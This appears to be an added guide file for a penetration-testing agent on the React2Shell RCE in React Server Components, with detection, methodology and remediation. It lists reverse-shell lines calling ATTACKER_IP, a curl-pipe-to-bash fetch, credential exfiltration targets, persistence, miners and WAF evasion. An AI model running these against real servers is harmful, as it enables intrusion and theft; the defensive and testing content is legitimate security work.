@@ -1,0 +1,187 @@
+<react2shell_guide>
+<title>REACT2SHELL - RSC DESERIALIZATION RCE</title>
+
+<critical>CVE-2025-55182: Critical unauthenticated Remote Code Execution via React Server Components (RSC) Flight protocol. CVSS 10.0. Actively exploited by APT groups including China-nexus actors. Affects React 19.x and Next.js 15.x/16.x with App Router.</critical>
+
+<scope>
+- React 19.x (before 19.0.1, 19.1.2, 19.2.1)
+- Next.js 15.x/16.x with App Router
+- Vite RSC plugin
+- Parcel RSC plugin
+- React Router RSC preview
+- RedwoodSDK
+- Waku framework
+- Any framework implementing RSC Flight protocol
+</scope>
+
+<vulnerability_details>
+The vulnerability exists in the React Server Components (RSC) "Flight" protocol deserialization process. When a server processes attacker-controlled RSC payloads without sufficient validation, it becomes possible to execute arbitrary JavaScript code on the server.
+
+Key characteristics:
+- No authentication required
+- No user interaction needed
+- No elevated permissions required
+- Single HTTP request is sufficient for exploitation
+- Payload processed BEFORE application authentication logic
+</vulnerability_details>
+
+<exploit_technique>
+The React2Shell exploit leverages JavaScript duck-typing and dynamic code execution through a four-stage attack:
+
+1. SELF-REFERENCE LOOP CREATION
+   - Create a self-referential loop in the RSC payload
+   - Abuse JavaScript object property resolution
+
+2. ATTACKER CODE INVOCATION
+   - Trick JavaScript runtime into calling attacker-controlled code
+   - Leverage prototype chain manipulation
+
+3. MALICIOUS DATA INJECTION
+   - Inject malicious data for initialization
+   - Exploit deserialization to instantiate objects
+
+4. ARBITRARY CODE EXECUTION
+   - Execute code via Blob Handler
+   - Achieve RCE through Flight protocol processing
+</exploit_technique>
+
+<detection>
+Identify vulnerable targets:
+- Look for Next.js App Router indicators (/_next/static, RSC headers)
+- Check for React 19.x version disclosure
+- Identify RSC endpoints responding to Flight protocol
+- Look for x-nextjs-* headers or similar framework indicators
+- Check for /_actions endpoints (Server Actions)
+
+Vulnerable indicators:
+- Applications using "use server" directives
+- Next.js apps with app/ directory structure
+- React applications with Server Components enabled
+- Any endpoint accepting RSC Flight payloads
+</detection>
+
+<exploitation_payloads>
+System Information Gathering:
+- Execute: uname -a, whoami, hostname, id
+- Read: /etc/passwd, /etc/shadow (if root)
+- Enumerate: environment variables, AWS credentials
+
+Reverse Shell Examples:
+- bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1
+- python -c 'import socket,subprocess,os;...'
+- curl ATTACKER_SERVER/shell.sh | bash
+
+Data Exfiltration Targets:
+- AWS config files: ~/.aws/credentials, ~/.aws/config
+- Environment variables: process.env export
+- Application secrets: .env files, config.js
+
+Post-Exploitation:
+- Install SSH keys for persistence
+- Create systemd services for persistence
+- Deploy cryptominers (XMRig observed in wild)
+- Deploy backdoors (PeerBlight, CowTunnel, ZinFoq)
+- Deploy Cobalt Strike/Sliver beacons
+</exploitation_payloads>
+
+<methodology>
+1. RECONNAISSANCE
+   - Identify React/Next.js applications
+   - Detect RSC endpoint locations
+   - Fingerprint framework version
+   - Map server functions and actions
+
+2. VULNERABILITY CONFIRMATION
+   - Send crafted Flight protocol payload
+   - Check for deserialization behavior
+   - Confirm RCE capability with safe command (sleep, DNS lookup)
+
+3. EXPLOITATION
+   - Develop appropriate payload for target OS
+   - Execute code to gain initial access
+   - Establish persistence if authorized
+
+4. POST-EXPLOITATION
+   - Enumerate internal network
+   - Access cloud metadata endpoints
+   - Exfiltrate sensitive data
+   - Pivot to internal systems
+
+5. REPORTING
+   - Document affected versions
+   - Provide PoC requests
+   - Detail impact assessment
+   - Recommend immediate patching
+</methodology>
+
+<related_cves>
+- CVE-2025-55182: Critical RCE (CVSS 10.0)
+- CVE-2025-55184: DoS via RSC (High severity)
+- CVE-2025-55183: Source Code Exposure (Medium severity)
+- CVE-2025-67779: Incomplete DoS fix
+</related_cves>
+
+<waf_bypass_techniques>
+- Fragment payloads across multiple requests
+- Use encoding variations (base64, hex, unicode)
+- Leverage HTTP parameter pollution
+- Send via WebSocket upgrade if available
+- Use chunked transfer encoding
+- Obfuscate JavaScript constructs in payload
+</waf_bypass_techniques>
+
+<validation>
+1. Confirm React/Next.js version is vulnerable
+2. Demonstrate code execution with harmless payload
+3. Show clear request/response with exploit
+4. Provide version-specific PoC
+5. Test in local environment before production testing
+</validation>
+
+<false_positives>
+- Next.js Pages Router (not affected, only App Router)
+- React versions before 19.x
+- Properly patched versions
+- Applications without RSC endpoints
+- Static-only Next.js deployments
+</false_positives>
+
+<impact>
+- CRITICAL: Unauthenticated Remote Code Execution
+- Full server compromise
+- Data exfiltration and manipulation
+- Lateral movement to internal networks
+- Cloud infrastructure compromise (AWS/GCP/Azure)
+- Supply chain attacks via modified deployments
+</impact>
+
+<remediation>
+IMMEDIATE ACTIONS:
+1. Update React to 19.0.1, 19.1.2, or 19.2.1+
+2. Update Next.js to latest patched version
+3. Apply Cloudflare/WAF rules for RSC payload detection
+4. Monitor for exploitation attempts
+5. Review server logs for suspicious RSC requests
+
+LONG-TERM:
+- Implement input validation on all RSC endpoints
+- Enable runtime security monitoring
+- Deploy web application firewall with RSC rules
+- Regular security assessments
+</remediation>
+
+<pro_tips>
+1. Start with version fingerprinting - exploitation depends heavily on exact version
+2. Use DNS/OAST callbacks for blind confirmation before noisy payloads
+3. Target development/staging environments before production
+4. Check for cloud metadata accessibility (169.254.169.254)
+5. Enumerate all RSC endpoints - some may have weaker protections
+6. Monitor for published PoCs and adapt payloads
+7. This vuln bypasses auth - test unauthorized access paths
+8. Check for rate limiting that might block exploitation
+9. Some WAFs detect known payloads - use custom encoding
+10. Document exact version info - patches may introduce new CVEs
+</pro_tips>
+
+<remember>React2Shell represents a critical class of server-side JavaScript deserialization vulnerabilities. Applications using React Server Components require immediate assessment, regardless of whether they explicitly use server functions. The pre-auth nature makes this exceptionally dangerous for internet-facing applications.</remember>
+</react2shell_guide>
